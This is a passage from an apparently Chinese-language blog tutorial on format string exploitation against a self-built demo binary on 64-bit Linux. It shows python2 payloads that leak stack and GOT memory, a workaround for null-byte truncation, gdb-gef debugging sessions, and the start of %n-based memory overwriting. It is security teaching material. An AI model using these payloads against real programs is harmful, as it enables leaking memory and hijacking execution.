</span><br></pre></td></tr></table></figure><p>我们看到这里有点问题，本来应该在最后输出.ABCDEFGH字符串的，但是并没有输出。推测是由于最前面的00导致了字符串截断（实验结果说明如下）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%9$p&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%9$x&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%9$x&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����.782439</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%9$p&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����.0x702439</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%9$s&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f&quot;+&quot;.%p&quot;*20)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����.0x1.0x88888888.0xffffffff.0x7fffffffdf36.0x7c.0x4241000000000000.0x484746454443.0x252e7fffffffded8.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x7025.0x7fffffffdfb7.0x7fffffffdfb6.0x40125d.0x7ffff7fa72e8</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\xd8\xde\xff\xff\xff\x7f\x00\x00&quot;+&quot;.%p&quot;*20)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">�����</span><br></pre></td></tr></table></figure><p>通过前几次测试，我们发现当地址有\x00时，无论如何变化格式符，结果都一样，这时我就有点怀疑是发生了截断。去掉\x00后再测试，这时就输出了结果，果然是发生了截断。但是这个地址必须要有\x00，该怎么办呢？我看到了下面这篇文章，找到了解决办法 — 把地址放到最后，然后通过测试找出偏移。</p><blockquote><p>参考资料：<a href="https://www.anquanke.com/post/id/194458">64位格式化字符串漏洞修改got表利用详解</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*9+&quot;.%10$p.&quot;+&quot;\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">AAAAAAAAA.0x7fffffffded6.�����</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*9+&quot;.%10$s.&quot;+&quot;\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemo &lt; text</span><br><span class="line">AAAAAAAAA..�����</span><br></pre></td></tr></table></figure><p>这时，我们找到了偏移地址为10，不过我们仍然无法输出字符串，这是怎么回事呢？gdb调试一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">Reading symbols from fmtdemo...</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">88 commands loaded and 5 functions added for GDB 9.1 in 0.01ms using Python engine 3.8</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x4141414141414141 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x2e73243031252e41</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot;</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAAA.ABCDEFGH.�����</span><br><span class="line">[Inferior 1 (process 22967) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>我们发现，调试出来的程序输出了字符串，我推测是关于调试态和运行态的区别吧，奈何我对于linux上的这一块不熟悉。如有大佬了解原因，恳请您答疑。</p><hr><p>当然这也没有什么用，我们真正经常用到的地方是，把程序中某函数的 GOT 地址传进去，然后获得该地址所对应的函数的虚拟地址。然后根据函数在 libc 中的相对位置，计算出我们需要的函数地址（如 <code>system()</code>）。如下面展示的这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$  readelf -r fmtdemo</span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rela.dyn&#x27; at offset 0x4f0 contains 2 entries:</span><br><span class="line">  偏移量          信息           类型           符号值        符号名称 + 加数</span><br><span class="line">000000403ff0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0</span><br><span class="line">000000403ff8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line"></span><br><span class="line">重定位节 &#x27;.rela.plt&#x27; at offset 0x520 contains 3 entries:</span><br><span class="line">  偏移量          信息           类型           符号值        符号名称 + 加数</span><br><span class="line">000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 putchar@GLIBC_2.2.5 + 0</span><br><span class="line">000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0</span><br><span class="line">000000404028  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0</span><br><span class="line">sakura@Kylin:~/文档/print$ </span><br></pre></td></tr></table></figure><p><code>.rel.plt</code> 中有四个函数可供我们选择，按理说选择任意一个都没有问题，但是在实践中我们会发现一些问题。下面的结果分别是 <code>printf</code>、<code>__libc_start_main</code>、<code>putchar</code> 和 <code>__isoc99_scanf</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\x20\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x401200..0x7ffff7fa72e8.</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\xf0\x3f\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x403ff0..0x7ffff7fa7200.�?@</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\x18\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x404018..0x7ffff7fa7200.@@</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x404028..0x7ffff7fa7200.(@@</span><br></pre></td></tr></table></figure><p>细心一点你就会发现第一个（<code>printf</code>）的结果有问题。我们输入了 <code>\x20\x40\x40\x00\x00\x00\x00\x00</code>（<code>0x000000404020</code>），可是 21 号位置输出的结果却是 <code>0x401200</code>，那么，<code>\20</code> 哪去了？</p><p>查了一下 ASCII 表，发现 <code>\x0C</code> (’\f’)、<code>\x07</code>（’\a’）、<code>\x08</code>（’\b’）、<code>\x20</code>（SPACE）等的不可见字符都会被省略。这就会让我们后续的操作出现问题。所以这里我们选用最后一个（<code>__isoc99_scanf</code>）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$p&quot;+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAAAA.0x404028(@@</span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$s&quot;+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27; | ./fmtdemo</span><br><span class="line">AAAAAAAAAA.�����(@@</span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$p&quot;+&quot;\x28\x40\x40\x00\x00\x00\x00\x00&quot;)&#x27;&gt;text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">gef➤  b printf</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  <span class="string">&quot;AAAAAAAAAA.%10<span class="variable">$p</span>(@@&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: &quot;AAAAAAAAAA.%10$p(@@&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: &quot;AA.%10$p(@@&quot;</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x0000000000404028  →  0x00007ffff7e190b0  →  &lt;__isoc99_scanf+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/g 0x0000000000404028</span><br><span class="line">0x404028 &lt;__isoc99_scanf@got.plt&gt;:0x7ffff7e190b0</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAAAA.0x404028(@@</span><br><span class="line">[Inferior 1 (process 23800) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>虽然我们可以通过 <code>x/w</code> 指令得到 <code>__isoc99_scanf</code> 函数的虚拟地址 <code>0x7ffff7e190b0</code>。但是由于 <code>0x0000000000404028</code> 处的内容是仍然一个指针，使用 <code>%10$s</code> 打印并不成功。</p><h4 id="224-栈数据覆盖"><a class="markdownIt-Anchor" href="#224-栈数据覆盖"></a> 2.2.4 栈数据覆盖</h4><p>现在我们已经可以读取栈上和任意地址的内存了，接下来我们更进一步，通过修改栈和内存来劫持程序的执行流程。<code>%n</code> 转换指示符将 <code>%n</code> 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//coverStack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %n\n&quot;</span>, str, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ ./coverStack </span><br><span class="line">hello </span><br><span class="line">6</span><br></pre></td></tr></table></figure><p><code>i</code> 被赋值为 6，因为在遇到转换指示符之前一共写入了 6 个字符（<code>hello</code> 加上一个&quot;\0&quot;）。在没有长度修饰符时，默认写入一个 <code>int</code> 类型的值。</p><p>通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数，即在格式字符串中加上一个十进制整数来表示输出的最小位数，如果实际位数大于定义的宽度，则按实际位数输出，反之则以空格或 0 补齐（<code>0</code> 补齐时在宽度前加点<code>.</code> 或 <code>0</code>）。如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//coverStack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%10u%n\n&quot;</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.50u%n\n&quot;</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%0100u%n\n&quot;</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 